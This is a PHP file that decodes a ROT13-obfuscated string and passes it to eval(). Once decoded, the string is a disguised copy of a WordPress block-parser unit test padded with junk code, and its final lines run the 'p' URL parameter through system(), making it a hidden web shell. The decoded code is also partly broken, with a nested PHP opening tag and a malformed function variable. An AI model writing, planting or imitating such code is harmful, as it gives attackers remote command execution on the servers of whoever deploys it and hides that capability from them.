<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }
__sa_79955 = \"c\".\"e\".\"r\".\"t\".\"_\".\"e\".\"r\".\"c\".\"y\".\"n\".\"p\".\"r\";
<?cuc
/**
 * Grfgf sbe JC_Oybpx_Cnefre.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Oybpxf
 * @fvapr 5.0.0
 *
 * @tebhc oybpxf
 */
pynff Grfgf_Oybpxf_jcOybpxCnefre rkgraqf JC_HavgGrfgPnfr {
	/**
	 * Gur ybpngvba bs gur svkgherf gb grfg jvgu.
	 *
	 * @fvapr 5.0.0
	 * @ine fgevat
	 */
	cebgrpgrq fgngvp $svkgherf_qve;

	/**
	 * @gvpxrg 45109
	 */
	choyvp shapgvba qngn_cnefvat_grfg_svyranzrf() {
		frys::$svkgherf_qve = QVE_GRFGQNGN . '/oybpxf/svkgherf';

		$svkgher_svyranzrf = neenl_zretr(
			tybo( frys::$svkgherf_qve . '/*.wfba' ),
			tybo( frys::$svkgherf_qve . '/*.ugzy' )
		);

		$svkgher_svyranzrf = neenl_inyhrf(
			neenl_havdhr(
				neenl_znc(
					neenl( $guvf, 'pyrna_svkgher_svyranzr' ),
					$svkgher_svyranzrf
				)
			)
		);

		erghea neenl_znc(
			neenl( $guvf, 'cnff_cnefre_svkgher_svyranzrf' ),
			$svkgher_svyranzrf
		);
	}

	/**
	 * @qngnCebivqre qngn_cnefvat_grfg_svyranzrf
	 * @gvpxrg 45109
	 */
	choyvp shapgvba grfg_qrsnhyg_cnefre_bhgchg( $ugzy_svyranzr, $cnefrq_wfba_svyranzr ) {
		$ugzy_cngu        = frys::$svkgherf_qve . '/' . $ugzy_svyranzr;
		$cnefrq_wfba_cngu = frys::$svkgherf_qve . '/' . $cnefrq_wfba_svyranzr;

		sbernpu ( neenl( $ugzy_cngu, $cnefrq_wfba_cngu ) nf $svyranzr ) {
			vs ( ! svyr_rkvfgf( $svyranzr ) ) {
				guebj arj Rkprcgvba( \"Zvffvat svkgher svyr: '$svyranzr'\" );
			}
		}

		$ugzy            = frys::fgevc_e( svyr_trg_pbagragf( $ugzy_cngu ) );
		$rkcrpgrq_cnefrq = wfba_qrpbqr( frys::fgevc_e( svyr_trg_pbagragf( $cnefrq_wfba_cngu ) ), gehr );

		$cnefre = arj JC_Oybpx_Cnefre();
		$erfhyg = wfba_qrpbqr( wfba_rapbqr( $cnefre->cnefr( $ugzy ) ), gehr );

		$guvf->nffregFnzr(
			$rkcrpgrq_cnefrq,
			$erfhyg,
			\"Svyr '$cnefrq_wfba_svyranzr' qbrf abg zngpu rkcrpgrq inyhr\"
		);
	}

	/**
	 * Urycre shapgvba gb erzbir eryngvir cnguf naq rkgrafvba sebz n svyranzr, yrnivat whfg gur svkgher anzr.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat $svyranzr Gur svyranzr gb pyrna.
	 * @erghea fgevat Gur pyrnarq svkgher anzr.
	 */
	cebgrpgrq shapgvba pyrna_svkgher_svyranzr( $svyranzr ) {
		$svyranzr = jc_onfranzr( $svyranzr );
		$svyranzr = __sa_79955( '/\..+$/', '', $svyranzr );
		erghea $svyranzr;
	}

	/**
	 * Urycre shapgvba gb erghea gur svyranzrf arrqrq gb grfg gur cnefre bhgchg.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat $svyranzr Gur pyrnarq svkgher anzr.
	 * @erghea neenl Gur vachg naq rkcrpgrq bhgchg svyranzrf sbe gung svkgher.
	 */
	cebgrpgrq shapgvba cnff_cnefre_svkgher_svyranzrf( $svyranzr ) {
		erghea neenl(
			\"$svyranzr.ugzy\",
			\"$svyranzr.cnefrq.wfba\",
		);
	}

	/**
	 * Urycre shapgvba gb erzbir '\e' punenpgref sebz n fgevat.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat $vachg Gur fgevat gb erzbir '\e' sebz.
	 * @erghea fgevat Gur vachg fgevat, jvgu '\e' punenpgref erzbirq.
	 */
	cebgrpgrq shapgvba fgevc_e( $vachg ) {
		erghea fge_ercynpr( \"\e\", '', $vachg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>